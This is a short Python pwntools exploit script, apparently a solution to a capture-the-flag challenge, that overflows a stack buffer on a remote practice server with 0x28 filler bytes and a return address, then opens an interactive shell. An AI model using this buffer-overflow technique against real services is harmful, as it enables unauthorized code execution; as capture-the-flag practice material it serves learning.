#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

host , port = 'ctf.yuawn.idv.tw' , 10100
y = remote( host , port )

p = flat(
    'D' * 0x28,
    0x40056a
)

sleep(1)

y.sendline( p )

y.interactive()